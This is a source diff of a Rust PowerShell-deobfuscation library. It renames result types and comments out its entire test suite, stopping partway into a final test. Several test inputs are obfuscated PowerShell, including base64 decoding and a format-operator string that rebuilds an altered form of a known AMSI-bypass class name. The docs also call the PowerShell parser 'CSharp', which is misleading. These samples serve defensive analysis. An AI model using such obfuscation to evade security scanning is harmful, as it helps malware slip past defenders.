@@ -46,8 +46,8 @@ mod parser;
 /// assert_eq!(result, "3");
 ///
 /// // Parse and get detailed results
-/// let script_result = session.parse_input("$b = 'Hello World'; $b").unwrap();
-/// println!("Result: {:?}", script_result.result());
+/// let program_result = session.parse_input("$b = 'Hello World'; $b").unwrap();
+/// println!("Result: {:?}", program_result.result());
 /// ```
 pub use parser::CSharpSession;
 pub(crate) use parser::NEWLINE;
@@ -79,14 +79,14 @@ pub use parser::PsValue;
 /// use ps_parser::CSharpSession;
 ///
 /// let mut session = CSharpSession::new();
-/// let script_result = session.parse_input("$a = 42; $a").unwrap();
+/// let program_result = session.parse_input("$a = 42; $a").unwrap();
 ///
 /// // Access different parts of the result
-/// println!("Final value: {:?}", script_result.result());
-/// println!("Output: {:?}", script_result.output());
-/// println!("Errors: {:?}", script_result.errors());
+/// println!("Final value: {:?}", program_result.result());
+/// println!("Output: {:?}", program_result.output());
+/// println!("Errors: {:?}", program_result.errors());
 /// ```
-pub use parser::ScriptResult;
+pub use parser::ProgramResult;
 /// Represents a parsed token from a CSharp script.
 ///
 /// Tokens are the building blocks of parsed CSharp code and are used
@@ -111,10 +111,10 @@ pub use parser::ScriptResult;
 /// use ps_parser::CSharpSession;
 ///
 /// let mut session = CSharpSession::new();
-/// let script_result = session.parse_input("$var = 123").unwrap();
+/// let program_result = session.parse_input("$var = 123").unwrap();
 ///
 /// // Inspect the tokens
-/// for token in script_result.tokens().all() {
+/// for token in program_result.tokens().all() {
 ///     println!("Token: {:?}", token);
 /// }
 /// ```
@@ -153,1003 +153,1158 @@ mod tests {
     use super::*;
     use crate::{ExpressionToken, StringExpandableToken};
 
-    #[test]
-    fn deobfuscation() {
-        // assign variable and print it to screen
-        let mut p = CSharpSession::new();
-        let input = r#" $script:var = [char]([int]("9e4e" -replace "e")+3); [int]'a';$var"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), 'a'.into());
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$script:var = 'a'", "[int]'a'", "'a'"].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 1);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            "ValError: Failed to convert value \"a\" to type Int"
-        );
+//     #[test]
+//     fn deobfuscation() {
+//         // assign variable and print it to screen
+//         let mut p = CSharpSession::new();
+//         let input = r#" $script:var = [char]([int]("9e4e" -replace "e")+3); [int]'a';$var"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), 'a'.into());
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$script:var = 'a'", "[int]'a'", "'a'"].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 1);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             "ValError: Failed to convert value \"a\" to type Int"
+//         );
 
-        // the same but do it in two parts
-        let mut p = CSharpSession::new();
-        let input = r#" $global:var = [char]([int]("9e4e" -replace "e")+3) "#;
-        let script_res = p.parse_input(input).unwrap();
+//         // the same but do it in two parts
+//         let mut p = CSharpSession::new();
+//         let input = r#" $global:var = [char]([int]("9e4e" -replace "e")+3) "#;
+//         let program_res = p.parse_input(input).unwrap();
 
-        assert_eq!(script_res.errors().len(), 0);
+//         assert_eq!(program_res.errors().len(), 0);
 
-        let script_res = p.parse_input(" [int]'a';$var ").unwrap();
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["[int]'a'", "'a'"].join(NEWLINE)
-        );
-        assert_eq!(script_res.output(), vec!["a"].join(NEWLINE));
-        assert_eq!(script_res.errors().len(), 1);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            "ValError: Failed to convert value \"a\" to type Int"
-        );
-    }
+//         let program_res = p.parse_input(" [int]'a';$var ").unwrap();
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["[int]'a'", "'a'"].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.output(), vec!["a"].join(NEWLINE));
+//         assert_eq!(program_res.errors().len(), 1);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             "ValError: Failed to convert value \"a\" to type Int"
+//         );
+//     }
 
-    #[test]
-    fn deobfuscation_non_existing_value() {
-        // assign not existing value, without forcing evaluation
-        let mut p = CSharpSession::new();
-        let input = r#" $local:var = $env:programfiles;[int]'a';$var"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$local:var = $env:programfiles", "[int]'a'", "$var"].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 3);
-        assert_eq!(
-            script_res.errors()[0].to_string(),
-            "VariableError: Variable \"programfiles\" is not defined"
-        );
-        assert_eq!(
-            script_res.errors()[1].to_string(),
-            "ValError: Failed to convert value \"a\" to type Int"
-        );
-        assert_eq!(
-            script_res.errors()[2].to_string(),
-            "VariableError: Variable \"var\" is not defined"
-        );
+//     #[test]
+//     fn deobfuscation_non_existing_value() {
+//         // assign not existing value, without forcing evaluation
+//         let mut p = CSharpSession::new();
+//         let input = r#" $local:var = $env:programfiles;[int]'a';$var"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$local:var = $env:programfiles", "[int]'a'", "$var"].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 3);
+//         assert_eq!(
+//             program_res.errors()[0].to_string(),
+//             "VariableError: Variable \"programfiles\" is not defined"
+//         );
+//         assert_eq!(
+//             program_res.errors()[1].to_string(),
+//             "ValError: Failed to convert value \"a\" to type Int"
+//         );
+//         assert_eq!(
+//             program_res.errors()[2].to_string(),
+//             "VariableError: Variable \"var\" is not defined"
+//         );
 
-        // assign not existing value, forcing evaluation
-        let mut p = CSharpSession::new().with_variables(Variables::force_eval());
-        let input = r#" $local:var = $env:programfiles;[int]'a';$script:var"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Null);
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$local:var = $null", "[int]'a'"].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 1);
-    }
+//         // assign not existing value, forcing evaluation
+//         let mut p = CSharpSession::new().with_variables(Variables::force_eval());
+//         let input = r#" $local:var = $env:programfiles;[int]'a';$script:var"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Null);
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$local:var = $null", "[int]'a'"].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 1);
+//     }
 
-    #[test]
-    fn deobfuscation_env_value() {
-        // assign not existing value, without forcing evaluation
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" $local:var = $env:programfiles;$var"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::String(std::env::var("PROGRAMFILES").unwrap())
-        );
-        let program_files = std::env::var("PROGRAMFILES").unwrap();
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                format!("$local:var = \"{}\"", program_files),
-                format!("\"{}\"", program_files)
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn deobfuscation_env_value() {
+//         // assign not existing value, without forcing evaluation
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" $local:var = $env:programfiles;$var"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::String(std::env::var("PROGRAMFILES").unwrap())
+//         );
+//         let program_files = std::env::var("PROGRAMFILES").unwrap();
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 format!("$local:var = \"{}\"", program_files),
+//                 format!("\"{}\"", program_files)
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn deobfuscation_from_base_64() {
-        let mut p = CSharpSession::new();
-        let input = r#" $encoded = [syStem.texT.EncoDInG]::unIcoDe.geTstRiNg([char]97);$encoded"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), String::from("\u{FFFD}").into());
+//     #[test]
+//     fn deobfuscation_from_base_64() {
+//         let mut p = CSharpSession::new();
+//         let input = r#" $encoded = [syStem.texT.EncoDInG]::unIcoDe.geTstRiNg([char]97);$encoded"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), String::from("\u{FFFD}").into());
 
-        let input = r#" [syStem.texT.EncoDInG]::unIcoDe.geTstRiNg([SYSTem.cOnVERT]::froMbasE64striNg("ZABlAGMAbwBkAGUAZAA="))"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), String::from("decoded").into());
-    }
+//         let input = r#" [syStem.texT.EncoDInG]::unIcoDe.geTstRiNg([SYSTem.cOnVERT]::froMbasE64striNg("ZABlAGMAbwBkAGUAZAA="))"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), String::from("decoded").into());
+//     }
 
-    #[test]
-    fn hash_table() {
-        // assign not existing value, without forcing evaluation
-        let mut p = CSharpSession::new().with_variables(Variables::env().values_persist());
-        let input = r#" 
-$nestedData = @{
-    Users = @(
-        @{ Name = "Alice"; Age = 30; Skills = @("CSharp", "Python") }
-        @{ Name = "Bob"; Age = 25; Skills = @("Java", "C#") }
-    )
-    Settings = @{
-        Theme = "Dark"
-        Language = "en-US"
-    }
-}
-"$nestedData"
-        "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::String("System.Collections.Hashtable".to_string())
-        );
+//     #[test]
+//     fn hash_table() {
+//         // assign not existing value, without forcing evaluation
+//         let mut p = CSharpSession::new().with_variables(Variables::env().values_persist());
+//         let input = r#" 
+// $nestedData = @{
+//     Users = @(
+//         @{ Name = "Alice"; Age = 30; Skills = @("CSharp", "Python") }
+//         @{ Name = "Bob"; Age = 25; Skills = @("Java", "C#") }
+//     )
+//     Settings = @{
+//         Theme = "Dark"
+//         Language = "en-US"
+//     }
+// }
+// "$nestedData"
+//         "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::String("System.Collections.Hashtable".to_string())
+//         );
 
-        assert_eq!(
-            p.parse_input("$nesteddata.settings").unwrap().result(),
-            PsValue::HashTable(HashMap::from([
-                ("language".to_string(), PsValue::String("en-US".to_string())),
-                ("theme".to_string(), PsValue::String("Dark".to_string())),
-            ]))
-        );
+//         assert_eq!(
+//             p.parse_input("$nesteddata.settings").unwrap().result(),
+//             PsValue::HashTable(HashMap::from([
+//                 ("language".to_string(), PsValue::String("en-US".to_string())),
+//                 ("theme".to_string(), PsValue::String("Dark".to_string())),
+//             ]))
+//         );
 
-        assert_eq!(
-            p.safe_eval("$nesteddata.settings.theme").unwrap(),
-            "Dark".to_string()
-        );
+//         assert_eq!(
+//             p.safe_eval_statements("$nesteddata.settings.theme").unwrap().to_string().as_str(),
+//             "Dark"
+//         );
 
-        assert_eq!(
-            p.parse_input("$nesteddata.users[0]").unwrap().result(),
-            PsValue::HashTable(HashMap::from([
-                (
-                    "skills".to_string(),
-                    PsValue::Array(vec![
-                        PsValue::String("CSharp".to_string()),
-                        PsValue::String("Python".to_string().into())
-                    ])
-                ),
-                ("name".to_string(), PsValue::String("Alice".to_string())),
-                ("age".to_string(), PsValue::Int(30)),
-            ]))
-        );
+//         assert_eq!(
+//             p.parse_input("$nesteddata.users[0]").unwrap().result(),
+//             PsValue::HashTable(HashMap::from([
+//                 (
+//                     "skills".to_string(),
+//                     PsValue::Array(vec![
+//                         PsValue::String("CSharp".to_string()),
+//                         PsValue::String("Python".to_string().into())
+//                     ])
+//                 ),
+//                 ("name".to_string(), PsValue::String("Alice".to_string())),
+//                 ("age".to_string(), PsValue::Int(30)),
+//             ]))
+//         );
 
-        assert_eq!(
-            p.safe_eval("$nesteddata.users[0]['name']").unwrap(),
-            "Alice".to_string()
-        );
+//         assert_eq!(
+//             p.safe_eval_statements("$nesteddata.users[0]['name']").unwrap().to_string().as_str(),
+//             "Alice"
+//         );
 
-        assert_eq!(
-            p.safe_eval("$nesteddata.users[0].NAME").unwrap(),
-            "Alice".to_string()
-        );
+//         assert_eq!(
+//             p.safe_eval_statements("$nesteddata.users[0].NAME").unwrap().to_string().as_str(),
+//             "Alice"
+//         );
 
-        let input = r#" $a=@{val = 4};$a.val"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(4));
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
-        );
-    }
+//         let input = r#" $a=@{val = 4};$a.val"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(4));
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$a = @{", "\tval = 4", "}", "4"].join(NEWLINE)
+//         );
+//     }
 
-    #[test]
-    fn test_simple_arithmetic() {
-        let input = r#"
-Write-Host "=== Test 3: Arithmetic Operations ===" -ForegroundColor Green
-$a = 10
-$b = 5
-Write-Output "Addition: $(($a + $b))"
-Write-Output "Subtraction: $(($a - $b))"
-Write-Output "Multiplication: $(($a * $b))"
-Write-Output "Division: $(($a / $b))"
-Write-Output "Modulo: $(($a % $b))"
-"#;
+//     #[test]
+//     fn test_simple_arithmetic() {
+//         let input = r#"
+// Write-Host "=== Test 3: Arithmetic Operations ===" -ForegroundColor Green
+// $a = 10
+// $b = 5
+// Write-Output "Addition: $(($a + $b))"
+// Write-Output "Subtraction: $(($a - $b))"
+// Write-Output "Multiplication: $(($a * $b))"
+// Write-Output "Division: $(($a / $b))"
+// Write-Output "Modulo: $(($a % $b))"
+// "#;
 
-        let script_result = CSharpSession::new().parse_input(input).unwrap();
+//         let program_result = CSharpSession::new().parse_input(input).unwrap();
 
-        assert_eq!(script_result.result(), PsValue::String("Modulo: 0".into()));
-        assert_eq!(
-            script_result.output(),
-            vec![
-                r#"=== Test 3: Arithmetic Operations ==="#,
-                r#"Addition: 15"#,
-                r#"Subtraction: 5"#,
-                r#"Multiplication: 50"#,
-                r#"Division: 2"#,
-                r#"Modulo: 0"#
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_result.errors().len(), 0);
-        assert_eq!(script_result.tokens().expandable_strings().len(), 6);
-        assert_eq!(
-            script_result.tokens().expandable_strings()[1],
-            StringExpandableToken::new(
-                "\"Addition: $(($a + $b))\"".to_string(),
-                "Addition: 15".to_string()
-            )
-        );
-        assert_eq!(script_result.tokens().expressions().len(), 12);
-        assert_eq!(
-            script_result.tokens().expressions()[2],
-            ExpressionToken::new("$a + $b".to_string(), PsValue::Int(15))
-        );
-    }
+//         assert_eq!(program_result.result(), PsValue::String("Modulo: 0".into()));
+//         assert_eq!(
+//             program_result.output(),
+//             vec![
+//                 r#"=== Test 3: Arithmetic Operations ==="#,
+//                 r#"Addition: 15"#,
+//                 r#"Subtraction: 5"#,
+//                 r#"Multiplication: 50"#,
+//                 r#"Division: 2"#,
+//                 r#"Modulo: 0"#
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_result.errors().len(), 0);
+//         assert_eq!(program_result.tokens().expandable_strings().len(), 6);
+//         assert_eq!(
+//             program_result.tokens().expandable_strings()[1],
+//             StringExpandableToken::new(
+//                 "\"Addition: $(($a + $b))\"".to_string(),
+//                 "Addition: 15".to_string()
+//             )
+//         );
+//         assert_eq!(program_result.tokens().expressions().len(), 12);
+//         assert_eq!(
+//             program_result.tokens().expressions()[2],
+//             ExpressionToken::new("$a + $b".to_string(), PsValue::Int(15))
+//         );
+//     }
 
-    #[test]
-    fn test_scripts() {
-        use std::fs;
-        let Ok(entries) = fs::read_dir("test_scripts") else {
-            panic!("Failed to read 'test_scripts' directory");
-        };
-        for entry in entries {
-            let dir_entry = entry.unwrap();
-            if std::fs::FileType::is_dir(&dir_entry.file_type().unwrap()) {
-                // If it's a directory, we can read the files inside it
-                let input_script = dir_entry.path().join("input.ps1");
-                let expected_deobfuscated_script = dir_entry.path().join("deobfuscated.txt");
-                let expected_output_script = dir_entry.path().join("output.txt");
+//     #[test]
+//     fn test_scripts() {
+//         use std::fs;
+//         let Ok(entries) = fs::read_dir("test_scripts") else {
+//             panic!("Failed to read 'test_scripts' directory");
+//         };
+//         for entry in entries {
+//             let dir_entry = entry.unwrap();
+//             if std::fs::FileType::is_dir(&dir_entry.file_type().unwrap()) {
+//                 // If it's a directory, we can read the files inside it
+//                 let input_script = dir_entry.path().join("input.ps1");
+//                 let expected_deobfuscated_script = dir_entry.path().join("deobfuscated.txt");
+//                 let expected_output_script = dir_entry.path().join("output.txt");
 
-                let Ok(input) = fs::read_to_string(&input_script) else {
-                    panic!("Failed to read test file: {}", input_script.display());
-                };
+//                 let Ok(input) = fs::read_to_string(&input_script) else {
+//                     panic!("Failed to read test file: {}", input_script.display());
+//                 };
 
-                let Ok(expected_deobfuscated) = fs::read_to_string(&expected_deobfuscated_script)
-                else {
-                    panic!(
-                        "Failed to read test file: {}",
-                        expected_deobfuscated_script.display()
-                    );
-                };
+//                 let Ok(expected_deobfuscated) = fs::read_to_string(&expected_deobfuscated_script)
+//                 else {
+//                     panic!(
+//                         "Failed to read test file: {}",
+//                         expected_deobfuscated_script.display()
+//                     );
+//                 };
 
-                let Ok(expected_output) = fs::read_to_string(&expected_output_script) else {
-                    panic!(
-                        "Failed to read test file: {}",
-                        expected_output_script.display()
-                    );
-                };
+//                 let Ok(expected_output) = fs::read_to_string(&expected_output_script) else {
+//                     panic!(
+//                         "Failed to read test file: {}",
+//                         expected_output_script.display()
+//                     );
+//                 };
 
-                let script_result = CSharpSession::new()
-                    .with_variables(Variables::env())
-                    .parse_input(&input)
-                    .unwrap();
+//                 let program_result = CSharpSession::new()
+//                     .with_variables(Variables::env())
+//                     .parse_input(&input)
+//                     .unwrap();
 
-                let expected_deobfuscated_vec = expected_deobfuscated
-                    .lines()
-                    .map(|s| s.trim_end())
-                    .collect::<Vec<&str>>();
+//                 let expected_deobfuscated_vec = expected_deobfuscated
+//                     .lines()
+//                     .map(|s| s.trim_end())
+//                     .collect::<Vec<&str>>();
 
-                let current_deobfuscated = script_result.deobfuscated();
-                let current_output = script_result.output();
+//                 let current_deobfuscated = program_result.deobfuscated();
+//                 let current_output = program_result.output();
 
-                let expected_output_vec = expected_output
-                    .lines()
-                    .map(|s| s.trim_end())
-                    .collect::<Vec<&str>>();
+//                 let expected_output_vec = expected_output
+//                     .lines()
+//                     .map(|s| s.trim_end())
+//                     .collect::<Vec<&str>>();
 
-                //save_files(&dir_entry, &current_deobfuscated, &current_output);
-                let current_deobfuscated_vec = current_deobfuscated
-                    .lines()
-                    .map(|s| s.trim_end())
-                    .collect::<Vec<&str>>();
+//                 //save_files(&dir_entry, &current_deobfuscated, &current_output);
+//                 let current_deobfuscated_vec = current_deobfuscated
+//                     .lines()
+//                     .map(|s| s.trim_end())
+//                     .collect::<Vec<&str>>();
 
-                let current_output_vec = current_output
-                    .lines()
-                    .map(|s| s.trim_end())
-                    .collect::<Vec<&str>>();
+//                 let current_output_vec = current_output
+//                     .lines()
+//                     .map(|s| s.trim_end())
+//                     .collect::<Vec<&str>>();
 
-                for i in 0..expected_deobfuscated_vec.len() {
-                    assert_eq!(
-                        expected_deobfuscated_vec[i],
-                        current_deobfuscated_vec[i],
-                        "File: {}, Deobfuscated line: {}",
-                        file_name(&dir_entry),
-                        i + 1
-                    );
-                }
+//                 for i in 0..expected_deobfuscated_vec.len() {
+//                     assert_eq!(
+//                         expected_deobfuscated_vec[i],
+//                         current_deobfuscated_vec[i],
+//                         "File: {}, Deobfuscated line: {}",
+//                         file_name(&dir_entry),
+//                         i + 1
+//                     );
+//                 }
 
-                for i in 0..expected_output_vec.len() {
-                    assert_eq!(
-                        expected_output_vec[i],
-                        current_output_vec[i],
-                        "File: {}, Output line: {}",
-                        file_name(&dir_entry),
-                        i + 1
-                    );
-                }
-            }
-        }
-    }
+//                 for i in 0..expected_output_vec.len() {
+//                     assert_eq!(
+//                         expected_output_vec[i],
+//                         current_output_vec[i],
+//                         "File: {}, Output line: {}",
+//                         file_name(&dir_entry),
+//                         i + 1
+//                     );
+//                 }
+//             }
+//         }
+//     }
 
-    fn file_name(dir_entry: &std::fs::DirEntry) -> String {
-        dir_entry
-            .path()
-            .components()
-            .last()
-            .unwrap()
-            .as_os_str()
-            .to_string_lossy()
-            .to_string()
-    }
+//     fn file_name(dir_entry: &std::fs::DirEntry) -> String {
+//         dir_entry
+//             .path()
+//             .components()
+//             .last()
+//             .unwrap()
+//             .as_os_str()
+//             .to_string_lossy()
+//             .to_string()
+//     }
 
-    #[allow(dead_code)]
-    fn save_files(dir_entry: &std::fs::DirEntry, deobfuscated: &str, output: &str) {
-        let name = file_name(dir_entry);
-        std::fs::write(format!("{}_deobfuscated.txt", name), deobfuscated).unwrap();
-        std::fs::write(format!("{}_output.txt", name), output).unwrap();
-    }
+//     #[allow(dead_code)]
+//     fn save_files(dir_entry: &std::fs::DirEntry, deobfuscated: &str, output: &str) {
+//         let name = file_name(dir_entry);
+//         std::fs::write(format!("{}_deobfuscated.txt", name), deobfuscated).unwrap();
+//         std::fs::write(format!("{}_output.txt", name), output).unwrap();
+//     }
 
-    #[test]
-    fn test_range() {
-        // Test for even numbers
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" $numbers = 1..10; $numbers"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "$numbers = @(1,2,3,4,5,6,7,8,9,10)",
-                "@(1,2,3,4,5,6,7,8,9,10)"
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn test_range() {
+//         // Test for even numbers
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" $numbers = 1..10; $numbers"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "$numbers = @(1,2,3,4,5,6,7,8,9,10)",
+//                 "@(1,2,3,4,5,6,7,8,9,10)"
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn even_numbers() {
-        // Test for even numbers
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" $numbers = 1..10; $evenNumbers = $numbers | Where-Object { $_ % 2 -eq 0 }; $evenNumbers"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::Array(vec![
-                PsValue::Int(2),
-                PsValue::Int(4),
-                PsValue::Int(6),
-                PsValue::Int(8),
-                PsValue::Int(10)
-            ])
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "$numbers = @(1,2,3,4,5,6,7,8,9,10)",
-                "$evennumbers = @(2,4,6,8,10)",
-                "@(2,4,6,8,10)"
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn even_numbers() {
+//         // Test for even numbers
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" $numbers = 1..10; $evenNumbers = $numbers | Where-Object { $_ % 2 -eq 0 }; $evenNumbers"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::Array(vec![
+//                 PsValue::Int(2),
+//                 PsValue::Int(4),
+//                 PsValue::Int(6),
+//                 PsValue::Int(8),
+//                 PsValue::Int(10)
+//             ])
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "$numbers = @(1,2,3,4,5,6,7,8,9,10)",
+//                 "$evennumbers = @(2,4,6,8,10)",
+//                 "@(2,4,6,8,10)"
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn divisible_by_2_and_3() {
-        // Test for even numbers
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" $numbers = 1..10; $numbers | Where { $_ % 2 -eq 0 } | ? { $_ % 3 -eq 0 }"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(script_res.result(), PsValue::Int(6));
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec!["$numbers = @(1,2,3,4,5,6,7,8,9,10)", "6"].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn divisible_by_2_and_3() {
+//         // Test for even numbers
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" $numbers = 1..10; $numbers | Where { $_ % 2 -eq 0 } | ? { $_ % 3 -eq 0 }"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(program_res.result(), PsValue::Int(6));
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec!["$numbers = @(1,2,3,4,5,6,7,8,9,10)", "6"].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    //#[test]
-    fn _test_function() {
-        // Test for even numbers
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" 
-function Get-Square($number) {
-    return $number * $number
-}
-"Square of 5: $(Get-Square 5)" "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "function Get-Square($number) {",
-                "    return $number * $number",
-                "}",
-                " \"Square of 5: $(Get-Square 5)\""
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 2);
-    }
+//     //#[test]
+//     fn _test_function() {
+//         // Test for even numbers
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" 
+// function Get-Square($number) {
+//     return $number * $number
+// }
+// "Square of 5: $(Get-Square 5)" "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "function Get-Square($number) {",
+//                 "    return $number * $number",
+//                 "}",
+//                 " \"Square of 5: $(Get-Square 5)\""
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 2);
+//     }
 
-    #[test]
-    fn test_if() {
-        // Test for even numbers
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" 
-        # Test 10: Conditional Statements
-if ($true) {
-    $if_result = "condition true"
-}
+//     #[test]
+//     fn test_if() {
+//         // Test for even numbers
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" 
+//         # Test 10: Conditional Statements
+// if ($true) {
+//     $if_result = "condition true"
+// }
 
-if ($false) {
-    $else_result = "false branch"
-} else {
-    $else_result = "true branch"
-}
+// if ($false) {
+//     $else_result = "false branch"
+// } else {
+//     $else_result = "true branch"
+// }
 
-$score = 85
-if ($score -ge 90) {
-    $grade = "A"
-} elseif ($score -ge 80) {
-    $grade = "B"
-} else {
-    $grade = "C"
-}
+// $score = 85
+// if ($score -ge 90) {
+//     $grade = "A"
+// } elseif ($score -ge 80) {
+//     $grade = "B"
+// } else {
+//     $grade = "C"
+// }
         
-        "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![
-                "$if_result = \"condition true\"",
-                "$else_result = \"true branch\"",
-                "$score = 85",
-                "$grade = \"B\""
-            ]
-            .join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//         "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![
+//                 "$if_result = \"condition true\"",
+//                 "$else_result = \"true branch\"",
+//                 "$score = 85",
+//                 "$grade = \"B\""
+//             ]
+//             .join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn format_operator() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
-        let input = r#" ("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ems'+'iUt'),'ls',('S'+'ystem.'+'Danage'+'men'+'t'),'i')"#;
-        let script_res = p.parse_input(input).unwrap();
-        assert_eq!(
-            script_res.result(),
-            PsValue::String("System.Danagement.Automation.EmsiUtils".into())
-        );
-        assert_eq!(
-            script_res.deobfuscated(),
-            vec![r#""System.Danagement.Automation.EmsiUtils""#].join(NEWLINE)
-        );
-        assert_eq!(script_res.errors().len(), 0);
-    }
+//     #[test]
+//     fn format_operator() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+//         let input = r#" ("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ems'+'iUt'),'ls',('S'+'ystem.'+'Danage'+'men'+'t'),'i')"#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert_eq!(
+//             program_res.result(),
+//             PsValue::String("System.Danagement.Automation.EmsiUtils".into())
+//         );
+//         assert_eq!(
+//             program_res.deobfuscated(),
+//             vec![r#""System.Danagement.Automation.EmsiUtils""#].join(NEWLINE)
+//         );
+//         assert_eq!(program_res.errors().len(), 0);
+//     }
 
-    #[test]
-    fn encod_command() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
